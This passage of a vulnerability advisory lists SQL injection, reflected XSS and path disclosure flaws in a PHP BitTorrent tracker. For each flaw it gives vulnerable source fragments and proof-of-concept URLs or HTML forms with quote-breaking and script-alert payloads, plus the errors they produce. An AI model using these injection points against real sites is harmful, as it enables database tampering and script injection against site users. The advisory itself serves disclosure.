http://pmbt/slove.php?trans_alert=1&rid=war&#039;axe
http://pmbt/slove.php?id=war&#039;axe


###############################################################################
22. SQL Injection in "takehelpans.php"
###############################################################################

Reason: insufficient sanitization of user-supplied data
Attack vector: user-supplied parameters "id" and "newstatus"
Preconditions:
 1. magic_quotes_gpc=off (for parameter "newstatus")
Result: attacker can manipulate database queries

 
PHP script "takehelpans.php" line 34:
------------------------[ source code start ]----------------------------------
if(isset($reopen))
{
 `id` =".$id." LIMIT 1 ;");
...
if(isset($change_status)){
 &#039;".$newstatus."&#039; WHERE `id` =".$id." LIMIT 1 ;");
------------------------[ source code end ]------------------------------------

Tests:

http://pmbt/takehelpans.php?reopen=1&id=waraxe
http://pmbt/takehelpans.php?change_status=1&newstatus=war&#039;axe


###############################################################################
23. SQL Injection in "takeoffedit.php"
###############################################################################

Reason: insufficient sanitization of user-supplied data
Attack vector: user-supplied POST parameters "id" and "category"
Preconditions:
 1. magic_quotes_gpc=off
Result: attacker can manipulate database queries

 
PHP script "takeoffedit.php" line 35:
------------------------[ source code start ]----------------------------------
$id = $_POST["id"];
...
$cat = $_POST["category"];
...
 name=&#039;".$db->sql_escape($name)."&#039;, descr=&#039;".$db->sql_escape($msg)."&#039; 
 where id=&#039;".$id."&#039;";
$db->sql_query($sql)or btsqlerror($sql); 
------------------------[ source code end ]------------------------------------

Test:
-------------------------[ test code start ]-----------------------------------
<html><body><center>
<form action="http://pmbt/takeoffedit.php" method="post">
<input type="hidden" name="category" value="war&#039;axe">
<input type="hidden" name="id" value="1">
<input type="submit" value="Test">
</form>
</center></body></html>
--------------------------[ test code end ]------------------------------------

Result:

You have an error in your SQL syntax; check the manual that corresponds to your
MySQL server version for the right syntax to use near &#039;axe&#039;, name=&#039;&#039;, descr=&#039;&#039;
where id=&#039;1&#039;&#039; at line 1


###############################################################################
24. SQL Injection in "takerequest.php"
###############################################################################

Reason: insufficient sanitization of user-supplied data
Attack vector: user-supplied POST parameter "requesttitle"
Preconditions:
 1. magic_quotes_gpc=off
Result: attacker can manipulate database queries


PHP script "takerequest.php" line 36:
------------------------[ source code start ]----------------------------------
$requesttitle = $_POST["requesttitle"];
$request = $requesttitle;
...
 descr, added) VALUES(1, &#039;".$user->id."&#039;, &#039;".$cat."&#039;, &#039;" . $request . "&#039;,
 &#039;".$msg."&#039;, NOW())")or die(mysql_error());
------------------------[ source code end ]------------------------------------

Test:
-------------------------[ test code start ]-----------------------------------
<html><body><center>
<form action="http://pmbt/takerequest.php" method="post">
<input type="hidden" name="requesttitle" value="war&#039;axe">
<input type="hidden" name="cat" value="1">
<input type="submit" value="Test">
</form>
</center></body></html>
--------------------------[ test code end ]------------------------------------

Result:

You have an error in your SQL syntax; check the manual that corresponds to your
MySQL server version for the right syntax to use near &#039;axe&#039;, &#039;&#039;, NOW())&#039; at
line 1


###############################################################################
25. SQL Injection in "takethankyou.php"
###############################################################################

Reason: insufficient sanitization of user-supplied data
Attack vector: user-supplied parameter "id"
Preconditions: none
Result: attacker can manipulate database queries

 
PHP script "takethankyou.php" line 36:
------------------------[ source code start ]----------------------------------
------------------------[ source code end ]------------------------------------

Test:

http://pmbt/takethankyou.php?id=waraxe


###############################################################################
26. SQL Injection in "torrents.php"
###############################################################################

Reason: insufficient sanitization of user-supplied data
Attack vector: user-supplied GET parameter "type"
Preconditions: none
Result: attacker can manipulate database queries

 
PHP script "torrents.php" line 89:
------------------------[ source code start ]----------------------------------
$sort =  (isset($_GET["sort"])) ? $_GET["sort"] : &#039;&#039;;
$type =  (isset($_GET["type"])) ? $_GET["type"] : &#039;&#039;;
...
...
...
 ".$torrent_per_page.";";
$res = $db->sql_query($sql) or btsqlerror($sql);
------------------------[ source code end ]------------------------------------

Test:

http://pmbt/torrents.php?sort=1&type=waraxe

Result:

You have an error in your SQL syntax; check the manual that corresponds to
your MySQL server version for the right syntax to use near &#039;waraxe,
torrent_torrents.added DESC LIMIT 0,10&#039; at line 1


###############################################################################
27. SQL Injection in "viewsnatches.php"
###############################################################################

Reason: insufficient sanitization of user-supplied data
Attack vector: user-supplied GET parameter "id"
Preconditions: none
Result: attacker can manipulate database queries

 
PHP script "viewsnatches.php" line 115:
------------------------[ source code start ]----------------------------------
$res3 = $db->sql_query($sql) or btsqlerror($sql);
------------------------[ source code end ]------------------------------------

Test:

http://pmbt/viewsnatches.php?id=waraxe

Result:

Unknown column &#039;waraxe&#039; in &#039;where clause&#039;


###############################################################################
28. SQL Injection in "votesview.php"
###############################################################################

Reason: insufficient sanitization of user-supplied data
Attack vector: user-supplied GET parameter "requestid"
Preconditions: none
Result: attacker can manipulate database queries

 
PHP script "votesview.php" line 35:
------------------------[ source code start ]----------------------------------
$requestid = $_GET[requestid];

=$requestid") or print(mysql_error());;
------------------------[ source code end ]------------------------------------

Test:

http://pmbt/votesview.php?requestid=waraxe

Result:

Unknown column &#039;waraxe&#039; in &#039;where clause&#039;


###############################################################################
29. Reflected XSS in "ban.php"
###############################################################################

Reason: insufficient sanitization of html output
Attack vector: user-supplied parameter "reson"
Preconditions: none

Test:

http://pmbt/ban.php?reson=<script>alert(123);</script>


###############################################################################
30. Reflected XSS in "bbcode.php"
###############################################################################

Reason: insufficient sanitization of html output
Attack vector: user-supplied POST parameter "test"
Preconditions: none

Test:
-------------------------[ test code start ]-----------------------------------
<html><body><center>
<form action="http://pmbt/bbcode.php" method="post">
<input type="hidden" name="test" value="<script>alert(123);</script>">
<input type="submit" value="Test">
</form>
</center></body></html>
--------------------------[ test code end ]------------------------------------


###############################################################################
31. Reflected XSS in "contactstaff.php"
###############################################################################

Reason: insufficient sanitization of html output
Attack vector: user-supplied GET parameter "returnto"
Preconditions: none

Test:

http://pmbt/contactstaff.php?returnto="><script>alert(123);</script>


###############################################################################
32. Reflected XSS in "faq.php"
###############################################################################

Reason: uninitialized variable "$faq_categ"
Attack vector: user-supplied parameter "faq_categ"
Preconditions: none

Test:

http://pmbt/faq.php?faq_categ[0][title]=<script>alert(123);</script>
&faq_categ[0][flag]=1


###############################################################################
33. Reflected XSS in "keno.php"
###############################################################################

Reason: insufficient sanitization of html output
Attack vector: user-supplied parameters "n1","n2","n3","n4","n5","n6","n7",
 "n8","n9","n10","n11","n12","n13","n14","n15","n16","n17","n18","n19","n20"
Preconditions: none

Test:

http://pmbt/keno.php?n1="><script>alert(123);</script>
http://pmbt/keno.php?n20="><script>alert(123);</script>


###############################################################################
34. Reflected XSS in "makepoll.php"
###############################################################################

Reason: insufficient sanitization of html output
Attack vector: user-supplied parameters "returnto" and "poll"
Preconditions: none

Test:

http://pmbt/makepoll.php?returnto=><script>alert(123);</script>
http://pmbt/makepoll.php?poll[id]=><script>alert(123);</script>


###############################################################################
35. Reflected XSS in "modrules.php"
###############################################################################

Reason: insufficient sanitization of html output
Attack vector: user-supplied parameter "res"
Preconditions: none

Test:

http://pmbt/modrules.php?act=newsect&
res[text]=</textarea><script>alert(123);</script>


###############################################################################
36. Reflected XSS in "polls.php"
###############################################################################

Reason: insufficient sanitization of html output
Attack vector: user-supplied parameters "pollid" and "returnto"
Preconditions: none

Test:

http://pmbt/polls.php?action=delete&pollid=><script>alert(123);</script>
http://pmbt/polls.php?action=delete&returnto=><script>alert(123);</script>


###############################################################################
37. Reflected XSS in "popuptest.php"
###############################################################################

Reason: insufficient sanitization of html output
Attack vector: user-supplied parameter "text"
Preconditions: none

Test:

http://pmbt/popuptest.php?text=<script>alert(123);</script>


###############################################################################
38. Reflected XSS in "redirect.php"
###############################################################################

Reason: insufficient sanitization of html output
Attack vector: user-supplied parameter "url"
Preconditions: none

Test:

http://pmbt/redirect.php?url=&#039;><script>alert(123);</script>


###############################################################################
39. Reflected XSS in "search.php"
###############################################################################

Reason: insufficient sanitization of html output
Attack vector: user-supplied parameter "search"
Preconditions: none

Test:

http://pmbt/search.php?search="><script>alert(123);</script>


###############################################################################
40. Reflected XSS in "user.php"
###############################################################################

Reason: insufficient sanitization of html output
Attack vector: user-supplied parameter "returnto"
Preconditions: none

Test:

http://pmbt/user.php?op=loginconfirm&returnto="><script>alert(123);</script>


###############################################################################
41. Reflected XSS in "ajax.php"
###############################################################################

Reason: insufficient sanitization of html output
Attack vector: user-supplied parameters "torrent", "password", "browsemenu",
 "pagemenu" and "torrentrating"
Preconditions: none

Tests:

http://pmbt/ajax.php?op=view_coments_page&torrent="></iframe><script>alert(123);</script>
http://pmbt/ajax.php?op=view_coments_page&password="></iframe><script>alert(123);</script>
http://pmbt/ajax.php?op=view_details_page&torrent=><script>alert(123);</script>
http://pmbt/ajax.php?op=view_details&torrent=><script>alert(123);</script>
http://pmbt/ajax.php?op=member_search&search=z&browsemenu=<script>alert(123);</script>
http://pmbt/ajax.php?op=member_search&search=z&pagemenu=<script>alert(123);</script>
http://pmbt/ajax.php?op=view_rate_page&torrentrating=<script>alert(123);</script>


###############################################################################
42. Full Path Disclosure in multiple scripts
###############################################################################

Tests:

http://pmbt/actb.php

Fatal error: Call to a member function sql_query() on a non-object
in C:\apache2www\actb.php on line 47


http://pmbt/findnotconnectable.php?action=sendpm

Fatal error: Call to undefined function stdhead()
in C:\apache2www\findnotconnectable.php on line 58


http://pmbt/torrents-needseed.php

Fatal error: Call to a member function sql_query() on a non-object
in C:\apache2www\torrents-needseed.php on line 35



Contact:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

come2waraxe@yahoo.com
Janek Vind "waraxe"

Waraxe forum:  http://www.waraxe.us/forums.html
Personal homepage: http://www.janekvind.com/
Random project: http://albumnow.com/
---------------------------------- [ EOF ] ------------------------------------



